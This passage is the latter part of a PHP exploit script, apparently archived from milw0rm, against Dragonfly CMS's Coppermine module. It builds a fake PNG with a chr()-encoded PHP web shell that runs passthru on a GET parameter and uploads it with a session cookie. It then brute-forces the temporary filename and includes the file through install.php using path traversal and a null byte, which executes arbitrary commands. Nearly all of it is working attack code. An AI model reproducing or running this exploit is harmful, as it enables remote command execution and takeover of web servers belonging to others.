           chr(221).chr(224).chr(233).chr(181).chr(18). chr(124).chr(149).chr(121).
           chr(197).chr(210).chr(111).chr(139).chr(110).chr(51). chr(28). chr(102).
           chr(5).  chr(128).chr(81). chr(146).chr(218).chr(8).  chr(35). chr(93).
           chr(163).chr(227).chr(1).  chr(77). chr(120).chr(243).chr(159).chr(201).
           chr(31). chr(72). chr(138).chr(228).chr(42). chr(226).chr(192).chr(78).
           chr(152).chr(76). chr(133).chr(211).chr(8).  chr(29). chr(14). chr(94).
           chr(159).chr(139).chr(94). chr(17). chr(210).chr(231).chr(188).chr(91).
           chr(163).chr(116).chr(99). chr(164).chr(124).chr(31). chr(140).chr(27).
           chr(73). chr(63). chr(56). chr(130).chr(117).chr(107).chr(41). chr(143).
           chr(82). chr(135).chr(47). chr(198).chr(147).chr(212).chr(225).chr(206).
           chr(224).chr(150).chr(103).chr(109).chr(207).chr(228).chr(251).chr(177).
           chr(188).chr(212).chr(83). chr(38). chr(109).chr(92). chr(117).chr(53).
           chr(180).chr(7).  chr(139).chr(222).chr(22). chr(95). chr(153).chr(199).
           chr(247).chr(130).chr(231).chr(85). chr(31). chr(14). chr(167).chr(244).
           chr(108).chr(143).chr(89). chr(15). chr(47). chr(249).chr(36). chr(62).
           chr(94). chr(239).chr(203).chr(224).chr(97). chr(216).chr(118).chr(231).
           chr(118).chr(244).chr(27). chr(205).chr(47). chr(201).chr(22). chr(182).
           chr(2).  chr(152).chr(114).chr(19). chr(200).chr(38). chr(153).chr(89).
           chr(239).chr(174).chr(127).chr(76). chr(232).chr(231).chr(1).  chr(125).
           chr(133).chr(84). chr(97). chr(144).chr(3).  chr(10). chr(103).chr(43).
           chr(250).chr(239).chr(145).chr(232).chr(126).chr(76). chr(241).chr(85).
           chr(17). chr(57). chr(244).chr(49). chr(4).  chr(29). chr(63). chr(134).
           chr(227).chr(111).chr(165).chr(212).chr(19). chr(1).  chr(90). chr(120).
           chr(25). chr(118).chr(228).chr(224).chr(85). chr(112).chr(193).chr(79).
           chr(144).chr(197).chr(249).chr(173).chr(54). chr(157).chr(79). chr(66).
           chr(39). chr(103).chr(15). chr(134).chr(241).chr(207).chr(184).chr(114).
           chr(82). chr(74). chr(37). chr(230).chr(10). chr(9).  chr(72). chr(4).
           chr(199).chr(60). chr(200).chr(116).chr(90). chr(187).chr(237).chr(111).
           chr(13). chr(184).chr(209).chr(146).chr(53). chr(79). chr(101).chr(185).
           chr(145).chr(34). chr(179).chr(84). chr(116).chr(231).chr(199).chr(189).
           chr(28). chr(36). chr(113).chr(84). chr(132).chr(6).  chr(11). chr(100).
           chr(242).chr(156).chr(158).chr(38). chr(165).chr(11). chr(196).chr(202).
           chr(103).chr(12). chr(91). chr(88). chr(95). chr(189).chr(157).chr(12).
           chr(85). chr(250).chr(79). chr(32). chr(97). chr(173).chr(109).chr(198).
           chr(171).chr(146).chr(79). chr(188).chr(226).chr(1).  chr(54). chr(203).
           chr(17). chr(110).chr(244).chr(136).chr(157).chr(43). chr(5).  chr(251).
           chr(135).chr(98). chr(184).chr(145).chr(214).chr(133).chr(152).chr(174).
           chr(162).chr(218).chr(198).chr(27). chr(57). chr(137).chr(151).chr(241).
           chr(180).chr(171).chr(203).chr(118).chr(209).chr(88). chr(183).chr(10).
           chr(11). chr(222).chr(108).chr(48). chr(159).chr(78). chr(188).chr(27).
           chr(26). chr(52). chr(30). chr(49). chr(21). chr(17). chr(105).chr(5).
           chr(100).chr(99). chr(123).chr(90). chr(242).chr(132).chr(169).chr(241).
           chr(43). chr(155).chr(188).chr(29). chr(67). chr(98). chr(48). chr(121).
           chr(55). chr(207).chr(110).chr(47). chr(34). chr(151).chr(193).chr(95).
           chr(72). chr(88). chr(219).chr(241).chr(190).chr(174).chr(150).chr(32).
           chr(171).chr(124).chr(237).chr(244).chr(78). chr(123).chr(95). chr(97).
           chr(173).chr(175).chr(159).chr(48). chr(248).chr(130).chr(87). chr(19).
           chr(40). chr(3).  chr(82). chr(218).chr(73). chr(48). chr(10). chr(79).
           chr(131).chr(191).chr(88). chr(164).chr(234).chr(240).chr(18). chr(17).
           chr(194).chr(176).chr(179).chr(215).chr(201).chr(36). chr(6).  chr(72).
           chr(184).chr(36). chr(123).chr(102).chr(189).chr(152).chr(253).chr(71).
           chr(79). chr(29). chr(106).chr(48). chr(18). chr(141).chr(100).chr(216).
           chr(54). chr(187).chr(241).chr(69). chr(113).chr(162).chr(193).chr(87).
           chr(208).chr(156).chr(200).chr(80). chr(92). chr(38). chr(85). chr(48).
           chr(29). chr(241).chr(111).chr(82). chr(220).chr(32). chr(210).chr(109).
           chr(113).chr(238).chr(136).chr(204).chr(85). chr(214).chr(13). chr(52).
           chr(193).chr(100).chr(45). chr(85). chr(188).chr(103).chr(169).chr(104).
           chr(27). chr(159).chr(201).chr(104).chr(216).chr(152).chr(151).chr(139).
           chr(65). chr(22). chr(5).  chr(91). chr(76). chr(29). chr(129).chr(123).
           chr(150).chr(161).chr(150).chr(43). chr(93). chr(25). chr(250).chr(6).
           chr(76). chr(26). chr(203).chr(36). chr(188).chr(91). chr(50). chr(36).
           chr(165).chr(38). chr(177).chr(152).chr(66). chr(116).chr(19). chr(239).
           chr(245).chr(105).chr(34). chr(42). chr(184).chr(244).chr(201).chr(79).
           chr(205).chr(156).chr(123).chr(166).chr(137).chr(63). chr(144).chr(97).
           chr(237).chr(89). chr(134).chr(81). chr(41). chr(198).chr(252).chr(59).
           chr(166).chr(72). chr(191).chr(171).chr(228).chr(176).chr(185).chr(219).
           chr(119).chr(90). chr(199).chr(91). chr(6).  chr(61). chr(161).chr(58).
           chr(128).chr(112).chr(255).chr(147).chr(192).chr(193).chr(94). chr(102).
           chr(223).chr(166).chr(155).chr(4).  chr(250).chr(232).chr(30). chr(169).
           chr(225).chr(208).chr(47). chr(55). chr(213).chr(101).chr(152).chr(206).
           chr(14). chr(129).chr(80). chr(131).chr(98). chr(102).chr(240).chr(231).
           chr(171).chr(225).chr(193).chr(95). chr(69). chr(138).chr(42). chr(177).
           chr(6).  chr(56). chr(3).  chr(250).chr(209).chr(152).chr(220).chr(254).
           chr(131).chr(240).chr(54). chr(67). chr(77). chr(199).chr(106).chr(29).
           chr(60). chr(137).chr(77). chr(41). chr(119).chr(8).  chr(186).chr(61).
           chr(70). chr(247).chr(6).  chr(185).chr(122).chr(100).chr(91). chr(44).
           chr(7).  chr(136).chr(188).chr(250).chr(146).chr(181).chr(197).chr(219).
           chr(10). chr(68). chr(75). chr(213).chr(27). chr(81). chr(168).chr(166).
           chr(28). chr(105).chr(76). chr(179).chr(208).chr(162).chr(12). chr(54).
           chr(249).chr(14). chr(154).chr(84). chr(168).chr(97). chr(111).chr(40).
           chr(2).  chr(159).chr(155).chr(50). chr(116).chr(124).chr(185).chr(100).
           chr(54). chr(49). chr(12). chr(107).chr(206).chr(252).chr(68). chr(82).
           chr(10). chr(4).  chr(171).chr(184).chr(166).chr(26). chr(76). chr(31).
           chr(224).chr(52). chr(84). chr(157).chr(46). chr(15). chr(92). chr(169).
           chr(24). chr(58). chr(49). chr(89). chr(7).  chr(2).  chr(122).chr(54).
           chr(57). chr(224).chr(226).chr(231).chr(27). chr(163).chr(206).chr(248).
           chr(14). chr(39). chr(55). chr(153).chr(69). chr(38). chr(134).chr(87).
           chr(143).chr(206).chr(218).chr(170).chr(125).chr(13). chr(68). chr(83).
           chr(60). chr(234).chr(3).  chr(7).  chr(93). chr(30). chr(218).chr(53).
           chr(230).chr(209).chr(177).chr(1).  chr(195).chr(39). chr(155).chr(189).
           chr(252).chr(210).chr(175).chr(139).chr(40). chr(182).chr(206).chr(110).
           chr(255).chr(40). chr(174).chr(140).chr(119).chr(168).chr(66). chr(171).
           chr(86). chr(76). chr(92). chr(98). chr(80). chr(102).chr(63). chr(18).
           chr(68). chr(171).chr(160).chr(18). chr(226).chr(169).chr(152).chr(148).
           chr(170).chr(8).  chr(221).chr(253).chr(129).chr(75). chr(196).chr(119).
           chr(60). chr(36). chr(134).chr(183).chr(150).chr(87). chr(81). chr(178).
           chr(201).chr(187).chr(221).chr(7).  chr(129).chr(171).chr(103).chr(96).
           chr(154).chr(34). chr(145).chr(75). chr(62). chr(127).chr(215).chr(179).
           chr(128).chr(246).chr(211).chr(46). chr(217).chr(67). chr(199).chr(187).
           chr(48). chr(155).chr(141).chr(96). chr(159).chr(54). chr(32). chr(219).
           chr(105).chr(91). chr(102).chr(218).chr(205).chr(196).chr(188).chr(206).
           chr(123).chr(56). chr(123).chr(146).chr(115).chr(63). chr(41). chr(45).
           chr(41). chr(36). chr(225).chr(64). chr(34). chr(105).chr(210).chr(9).
           chr(138).chr(210).chr(241).chr(77). chr(175).chr(47). chr(193).chr(247).
           chr(15). chr(17). chr(29). chr(31). chr(195).chr(131).chr(197).chr(227).
           chr(120).chr(80). chr(236).chr(61). chr(169).chr(255).chr(99). chr(91).
           chr(64). chr(66). chr(40). chr(66). chr(47). chr(194).chr(196).chr(173).
           chr(224).chr(204).chr(17). chr(0).  chr(133).chr(97). chr(88). chr(80).
           chr(10). chr(190).chr(118).chr(211).chr(119).chr(24). chr(117).chr(236).
           chr(220).chr(222).chr(80). chr(224).chr(67). chr(100).chr(113).chr(83).
           chr(125).chr(138).chr(212).chr(106).chr(133).chr(1).  chr(103).chr(145).
           chr(63). chr(183).chr(38). chr(236).chr(124).chr(229).chr(80). chr(44).
           chr(10). chr(102).chr(149).chr(117).chr(120).chr(211).chr(99). chr(252).
           chr(146).chr(206).chr(175).chr(104).chr(107).chr(131).chr(87). chr(29).
           chr(43). chr(57). chr(48). chr(213).chr(118).chr(111).chr(73). chr(69).
           chr(75). chr(105).chr(145).chr(40). chr(200).chr(169).chr(222).chr(4).
           chr(95). chr(10). chr(31). chr(222).chr(48). chr(248).chr(133).chr(46).
           chr(89). chr(158).chr(133).chr(37). chr(145).chr(82). chr(65). chr(157).
           chr(42). chr(192).chr(44). chr(141).chr(67). chr(25). chr(175).chr(70).
           chr(149).chr(41). chr(76). chr(123).chr(6).  chr(127).chr(22). chr(228).
           chr(223).chr(2).  chr(193).chr(170).chr(172).chr(86). chr(34). chr(124).
           chr(246).chr(82). chr(80). chr(138).chr(60). chr(130).chr(141).chr(113).
           chr(155).chr(107).chr(148).chr(89). chr(128).chr(41). chr(48). chr(43).
           chr(126).chr(148).chr(92). chr(132).chr(2).  chr(212).chr(235).chr(21).
           chr(93). chr(109).chr(48). chr(203).chr(242).chr(244).chr(51). chr(210).
           chr(239).chr(146).chr(104).chr(26). chr(150).chr(73). chr(222).chr(155).
           chr(79). chr(19). chr(140).chr(176).chr(138).chr(31). chr(100).chr(86).
           chr(238).chr(40). chr(222).chr(210).chr(61). chr(58). chr(189).chr(168).
           chr(87). chr(68). chr(211).chr(50). chr(207).chr(194).chr(171).chr(197).
           chr(164).chr(83). chr(24). chr(118).chr(185).chr(205).chr(85). chr(176).
           chr(224).chr(197).chr(20). chr(208).chr(89). chr(233).chr(36). chr(60).
           chr(179).chr(178).chr(26). chr(145).chr(89). chr(174).chr(3).  chr(154).
           chr(249).chr(176).chr(37). chr(135).chr(206).chr(248).chr(149).chr(213).
           chr(125).chr(35). chr(173).chr(136).chr(82). chr(216).chr(243).chr(73).
           chr(113).chr(243).chr(215).chr(84). chr(81). chr(181).chr(100).chr(11).
           chr(211).chr(105).chr(147).chr(69). chr(172).chr(152).chr(85). chr(25).
           chr(190).chr(227).chr(20). chr(208).chr(8).  chr(208).chr(233).chr(121).
           chr(214).chr(96). chr(150).chr(243).chr(152).chr(115).chr(111).chr(136).
           chr(232).chr(180).chr(18). chr(23). chr(119).chr(241).chr(41). chr(130).
           chr(121).chr(202).chr(18). chr(155).chr(178).chr(14). chr(143).chr(195).
           chr(111).chr(119).chr(42). chr(102).chr(193).chr(164).chr(156).chr(103).
           chr(7).  chr(126).chr(69). chr(102).chr(201).chr(117).chr(71). chr(136).
           chr(204).chr(18). chr(111).chr(77). chr(20). chr(23). chr(97). chr(18).
           chr(132).chr(234).chr(213).chr(175).chr(148).chr(155).chr(80). chr(113).
           chr(51). chr(214).chr(79). chr(29). chr(162).chr(44). chr(175).chr(213).
           chr(39). chr(102).chr(121).chr(236).chr(46). chr(64). chr(34). chr(179).
           chr(0).  chr(88). chr(199).chr(44). chr(145).chr(120).chr(211).chr(19).
           chr(33). chr(191).chr(188).chr(133).chr(74). chr(80). chr(28). chr(191).
           chr(210).chr(25). chr(15). chr(133).chr(134).chr(219).chr(193).chr(50).
           chr(248).chr(154).chr(89). chr(222).chr(164).chr(28). chr(110).chr(145).
           chr(89). chr(189).chr(222).chr(218).chr(32). chr(179).chr(36). chr(51).
           chr(203).chr(127).chr(226).chr(250).chr(44). chr(16). chr(178).chr(100).
           chr(246).chr(203).chr(132).chr(52). chr(181).chr(168).chr(98). chr(35).
           chr(127).chr(88). chr(70). chr(201).chr(172).chr(129).chr(82). chr(208).
           chr(35). chr(219).chr(218).chr(132).chr(26). chr(199).chr(172).chr(171).
           chr(190).chr(15). chr(70). chr(152).chr(37). chr(253).chr(243).chr(173).
           chr(126).chr(14). chr(100).chr(55). chr(67). chr(147).chr(135).chr(60).
           chr(249).chr(226).chr(35). chr(185).chr(31). chr(196).chr(138).chr(89).
           chr(217).chr(224).chr(83). chr(158).chr(5).  chr(247).chr(184).chr(209).
           chr(92). chr(199).chr(80). chr(6).  chr(151).chr(246).chr(191).chr(220).
           chr(48). chr(80). chr(243).chr(204).chr(226).chr(219).chr(20). chr(21).
           chr(97). chr(59). chr(94). chr(175).chr(80). chr(10). chr(93). chr(92).
           chr(218).chr(27). chr(15). chr(25). chr(162).chr(103).chr(161).chr(226).
           chr(152).chr(193).chr(99). chr(183).chr(161).chr(42). chr(49). chr(2).
           chr(185).chr(191).chr(97). chr(113).chr(181).chr(81). chr(55). chr(136).
           chr(49). chr(107).chr(100).chr(181).chr(152).chr(178).chr(39). chr(104).
           chr(252).chr(174).chr(48). chr(204).chr(156).chr(119).chr(41). chr(23).
           chr(106).chr(99). chr(62). chr(64). chr(47). chr(98). chr(48). chr(78).
           chr(40). chr(74). chr(192).chr(172).chr(14). chr(137).chr(181).chr(245).
           chr(134).chr(54). chr(216).chr(100).chr(199).chr(150).chr(194).chr(95).
           chr(21). chr(7).  chr(187).chr(126).chr(243).chr(39). chr(174).chr(50).
           chr(57). chr(254).chr(172).chr(98). chr(138).chr(69). chr(212).chr(204).
           chr(86). chr(148).chr(143).chr(104).chr(252).chr(49). chr(28). chr(16).
           chr(25). chr(158).chr(53). chr(254).chr(175).chr(163).chr(88). chr(175).
           chr(110).chr(236).chr(30). chr(59). chr(21). chr(183).chr(145).chr(22).
           chr(145).chr(252).chr(100).chr(37). chr(62). chr(10). chr(229).chr(69).
           chr(164).chr(99). chr(90). chr(200).chr(104).chr(244).chr(97). chr(172).
           chr(100).chr(168).chr(174).chr(144).chr(200).chr(48). chr(236).chr(146).
           chr(131).chr(193).chr(159).chr(56). chr(161).chr(171).chr(93). chr(117).
           chr(167).chr(193).chr(51). chr(29). chr(142).chr(34). chr(130).chr(11).
           chr(231).chr(214).chr(51). chr(25). chr(222).chr(142).chr(123).chr(79).
           chr(29). chr(168).chr(12). chr(195).chr(13). chr(210).chr(26). chr(225).
           chr(51). chr(25). chr(5).  chr(66). chr(13). chr(127).chr(179).chr(103).
           chr(240).chr(91). chr(184).chr(76). chr(246).chr(117).chr(165).chr(62).
           chr(171).chr(184).chr(221).chr(129).chr(95). chr(120).chr(47). chr(131).
           chr(39). chr(50). chr(20). chr(20). chr(32). chr(106).chr(174).chr(203).
           chr(80). chr(29). chr(195).chr(134).chr(193).chr(219).chr(229).chr(242).
           chr(237).chr(109).chr(174).chr(201).chr(249).chr(82). chr(110).chr(255).
           chr(168).chr(102).chr(25). chr(153).chr(89). chr(153).chr(73). chr(88).
           chr(88). chr(103).chr(240).chr(64). chr(27). chr(113).chr(50). chr(116).
           chr(45). chr(46). chr(66). chr(94). chr(127).chr(209).chr(137).chr(81).
           chr(122).chr(70). chr(180).chr(42). chr(54). chr(30). chr(43). chr(191).
           chr(19). chr(91). chr(50). chr(116).chr(47). chr(73). chr(145).chr(23).
           chr(20). chr(81). chr(154).chr(152).chr(211).chr(163).chr(193).chr(15).
           chr(127).chr(139).chr(6).  chr(111).chr(87). chr(103).chr(65). chr(37).
           chr(201).chr(251).chr(40). chr(107).chr(244).chr(121).chr(172).chr(183).
           chr(59). chr(133).chr(103).chr(137).chr(120).chr(151).chr(202).chr(100).
           chr(163).chr(127).chr(43). chr(236).chr(170).chr(188).chr(12). chr(94).
           chr(25). chr(90). chr(85). chr(10). chr(100).chr(188).chr(147).chr(9).
           chr(164).chr(169).chr(199).chr(139).chr(193).chr(100).chr(104).chr(37).
           chr(220).chr(179).chr(68). chr(2).  chr(50). chr(125).chr(102).chr(51).
           chr(81). chr(138).chr(161).chr(85). chr(201).chr(16). chr(54). chr(192).
           chr(229).chr(50). chr(191).chr(161).chr(173).chr(237).chr(88). chr(131).
           chr(21). chr(101).chr(152).chr(239).chr(134).chr(94). chr(134).chr(32).
           chr(189).chr(36). chr(67). chr(187).chr(6).  chr(147).chr(225).chr(183).
           chr(128).chr(120).chr(77). chr(141).chr(234).chr(94). chr(98). chr(9).
           chr(56). chr(212).chr(54). chr(88). chr(110).chr(187).chr(147).chr(100).
           chr(120).chr(245).chr(157).chr(201).chr(112).chr(51). chr(38). chr(22).
           chr(198).chr(215).chr(88). chr(247).chr(222).chr(143).chr(45). chr(131).
           chr(119).chr(151).chr(77). chr(246).chr(213).chr(149).chr(185).chr(13).
           chr(86). chr(151).chr(225).chr(0).  chr(171).chr(222).chr(170).chr(149).
           chr(171).chr(250).chr(140).chr(148).chr(143).chr(190).chr(73). chr(107).
           chr(131).chr(231).chr(7).  chr(213).chr(215).chr(98). chr(86). chr(201).
           chr(214).chr(186).chr(103).chr(65). chr(43). chr(62). chr(65). chr(65).
           chr(65). chr(65). chr(65). chr(239).chr(123).chr(86). chr(96). chr(150).
           chr(72). chr(78). chr(74). chr(251).chr(245).chr(62). chr(146).chr(225).
           chr(31). chr(136).chr(175).chr(131).chr(53). chr(147).chr(225).chr(191).
           chr(204).chr(25). chr(245).chr(65). chr(60). chr(63). chr(112).chr(104).
           chr(112).chr(32). chr(101).chr(99). chr(104).chr(111).chr(34). chr(72).
           chr(105).chr(77). chr(97). chr(115).chr(116).chr(101).chr(114).chr(33).
           chr(34). chr(59). chr(111).chr(98). chr(95). chr(99). chr(108).chr(101).
           chr(97). chr(110).chr(40). chr(41). chr(59). chr(105).chr(110).chr(105).
           chr(95). chr(115).chr(101).chr(116).chr(40). chr(34). chr(109).chr(97).
           chr(120).chr(95). chr(101).chr(120).chr(101).chr(99). chr(117).chr(116).
           chr(105).chr(111).chr(110).chr(95). chr(116).chr(105).chr(109).chr(101).
           chr(34). chr(44). chr(48). chr(41). chr(59). chr(112).chr(97). chr(115).
           chr(115).chr(116).chr(104).chr(114).chr(117).chr(40). chr(36). chr(95).
           chr(71). chr(69). chr(84). chr(91). chr(99). chr(109).chr(100).chr(93).
           chr(41). chr(59). chr(100).chr(105).chr(101).chr(40). chr(41). chr(59).
           chr(63). chr(62). chr(73). chr(69). chr(78). chr(68). chr(65). chr(65).
           chr(65);

    $dAtA ="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"event\"\r\n\r\n";
    $dAtA.="picture\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"album\"\r\n\r\n";
    $dAtA.=$album."\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n";
    $dAtA.="1048576\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"userpicture\"; filename=\"C:\suntzooo.png\"\r\n";
    $dAtA.="Content-Type: image/x-png\r\n\r\n";
    $dAtA.=$SHELL."\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"title\"\r\n\r\n";
    $dAtA.="suntzu\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    $dAtA.="suntzoi\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"keywords\"\r\n\r\n";
    $dAtA.="sun-tzuuuu\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"user1\"\r\n\r\n\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"user2\"\r\n\r\n\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"user3\"\r\n\r\n\r\n";
    $dAtA.="-----------------------------7d63992eb01c6\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"user4\"\r\n\r\n\r\n";
    $dAtA.="-----------------------------7d63992eb01c6--\r\n";
    $pAcKeT="POST ".$p."index.php?name=coppermine&file=db_input&event=picture HTTP/1.1\r\n";
    $pAcKeT.="Content-Type: multipart/form-data; boundary=---------------------------7d63992eb01c6\r\n";
    $pAcKeT.="User-Agent: suntzu touches dragonfly with his finger\r\n";
    $pAcKeT.="Cookie: $COOKIE\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    $pAcKeT.=$dAtA;
    show($pAcKeT);
    sendpacketii($pAcKeT);
    if (eregi("no album where you are allowed to upload",$HtMl)){
      die("Something goes wrong...maybe you have not upload rights...<br>");
      }


    # STEP 5 -> Lookin' for a php[some hex values].tmp file and launch commands...
    # we will create a suntzu.tmp file in dragonfly main root with the filename
    # so we have not to search the shell next time the exploit is launched

    for ($i=0; $i<=15; $i++) {
      for ($j=0; $j<=15; $j++) {
        $x=$i;
        if ($i>9) {$temp=dechex($i);
                   $x=$temp;}
        $y=$j;
        if ($j>9) {$temp=dechex($j);
	           $y=$temp;}
        $filepath="../modules/coppermine/albums/userpics/php".$x.$y.".tmp".chr(0x00);
        $filepath=urlencode($filepath);

	//a test command...this should works both on Win and Linux boxes...
	$cmdtest="echo filename:php$x$y.tmp> suntzu.tmp";

	$cmdtest=urlencode($cmdtest);
        $pAcKeT="GET ".$p."install.php?cmd=$cmdtest&newlang=$filepath HTTP/1.1\r\n";
        $pAcKeT.="Host: ".$host."\r\n";
        $pAcKeT.="User-Agent: Mata Hari/2.00\r\n";
        $pAcKeT.="Connection: Close\r\n\r\n";
        show($pAcKeT);
        sendpacketii($pAcKeT);refresh();
        $pAcKeT="GET ".$p."suntzu.tmp HTTP/1.1\r\n";
        $pAcKeT.="Host: ".$host."\r\n";
        $pAcKeT.="Connection: Close\r\n\r\n";
        show($pAcKeT);
        sendpacketii($pAcKeT);refresh();
        if (eregi("filename:",$HtMl)) {
             echo("Exploit succeeded...Now launch desired command...<br>");
             $temp=explode("filename:",$HtMl);
             $temp2=explode(".tmp",$temp[1]);
             $filename=$temp2[0].".tmp";
             $filepath="../../modules/coppermine/albums/userpics/".$filename.chr(0x00);
             $filepath=urlencode($filepath);
             $pAcKeT="GET ".$p."install.php?cmd=$CMD&newlang=$filepath HTTP/1.1\r\n";
             $pAcKeT.="Host: ".$host."\r\n";
             $pAcKeT.="User-Agent: minibot\r\n";
             $pAcKeT.="Connection: Close\r\n\r\n";
             show($pAcKeT);
             sendpacketii($pAcKeT);die;
				     }
			     }
			   }
      //if you are here...
      echo "Exploit failed... maybe dragonfly patched...";
}
else
{echo "Fill * required fields, optionally specify a proxy...";}
?>

# milw0rm.com [2006-02-08]
